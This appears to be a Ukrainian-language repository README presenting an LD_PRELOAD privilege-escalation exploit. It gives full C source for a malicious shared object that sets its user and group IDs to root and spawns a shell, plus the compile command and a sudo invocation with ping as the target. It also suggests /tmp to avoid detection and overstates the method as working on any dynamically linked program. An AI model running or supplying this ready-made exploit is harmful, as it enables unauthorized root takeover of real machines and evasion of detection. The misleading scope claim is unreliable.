<h1>ld_preload-privilege-escalation</h1>
<h2>Опис</h2>
<p><code>LD_PRELOAD</code> — це змінна середовища, яка використовується для попереднього завантаження загальних бібліотек у програму або скрипт перед її виконанням. Це дозволяє замінити функції за замовчуванням програми, що дає змогу маніпулювати її поведінкою.</p><p>Цей репозиторій демонструє експлойт ескалації прав за допомогою змінної <code>LD_PRELOAD</code>. Створюючи спеціальну загальну бібліотеку, ми можемо впровадити її в програму та ескалювати привілеї, наприклад, для запуску довільних команд з правами root.</p>
<h2>Пояснення</h2>
<p>Ми створимо загальну бібліотеку, яку можна буде завантажити в програму за допомогою <code>LD_PRELOAD</code>, що дозволить нам ескалувати привілеї програми до прав root. Ключова ідея — використання змінної <code>LD_PRELOAD</code> для попереднього завантаження шкідливої бібліотеки перед виконанням цільової програми.</p>

<h3>Кроки реалізації</h3>
<ol>
<li><strong>Створення бібліотеки-експлойту:</strong> Спершу ми напишемо програму на C (файл <code>shell.c</code>), яку скомпілюємо в загальний об'єкт (файл <code>shell.so</code>). Ця бібліотека виконає ескалацію привілеїв, запустивши оболонку з правами root.</li>
</ol> 
'''
<pre><code>#include &lt;stdio.h&gt;
     #include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}</code></pre>

    <p>У цьому коді:</p>
    <ul>
        <li><code>setgid(0)</code> і <code>setuid(0)</code> встановлюють ID групи та користувача на <code>0</code>, що відповідає користувачу root.</li>
        <li><code>system("/bin/sh")</code> запускає оболонку з правами root.</li>
    </ul>

    <ol start="2">
        <li><strong>Компиляція бібліотеки:</strong> Після написання коду потрібно скомпілювати його в загальний об'єкт за допомогою наступної команди:</li>
    </ol>
    <pre><code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code></pre>

    <p>Це створить файл <code>shell.so</code>, який є загальним об'єктом, що може бути завантажений в інші програми за допомогою <code>LD_PRELOAD</code>.</p>

    <ol start="3">
        <li><strong>Встановлення змінної LD_PRELOAD:</strong> Щоб скористатися вразливістю програми, потрібно встановити змінну середовища <code>LD_PRELOAD</code> на шлях до нашої шкідливої бібліотеки. Припустимо, що об'єкт зберігається в <code>/tmp</code> для зручності доступу.</li>
    </ol>
    <pre><code>sudo LD_PRELOAD=/tmp/shell.so ping</code></pre>

    <p>Ця команда змушує програму <code>ping</code> завантажити нашу шкідливу бібліотеку перед її виконанням. В результаті, при запуску програми <code>ping</code>, вона отримає права root і відкриє оболонку.</p>

    <h2>Важливі зауваження</h2>
    <ul>
        <li><strong>Місце зберігання об'єкта:</strong> Шкідлива бібліотека (<code>shell.so</code>) не обов'язково повинна знаходитися в <code>/tmp</code>, але це зручне місце для уникнення виявлення.</li>
        <li><strong>Цільова програма:</strong> У цьому прикладі ми використовуємо програму <code>ping</code> як ціль. Однак цей метод можна застосувати до будь-якої програми, яка динамічно завантажує бібліотеки.</li>
        <li><strong>Безпекові наслідки:</strong> Використання <code>LD_PRELOAD</code> таким чином може бути використано для ескалації прав, що є суттєвою загрозою для безпеки. Переконайтеся, що ви розумієте юридичні та етичні наслідки використання цього експлойту.</li>
    </ul>

    <h2>Приклад використання</h2>
    <pre><code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so ping</code></pre>

    <p>Це дозволить ескалувати привілеї і запустити оболонку з правами root.</p>

    <h2>Висновок</h2>
    <p>Цей приклад демонструє, як можна використовувати <code>LD_PRELOAD</code> для ескалації прав. Хоча цей метод є потужним, важливо розуміти його потенціал для шкідливого використання. Системи повинні бути налаштовані для мінімізації таких ризиків, забезпечуючи належну безпеку та захист від експлойтів типу <code>LD_PRELOAD</code>.</p>
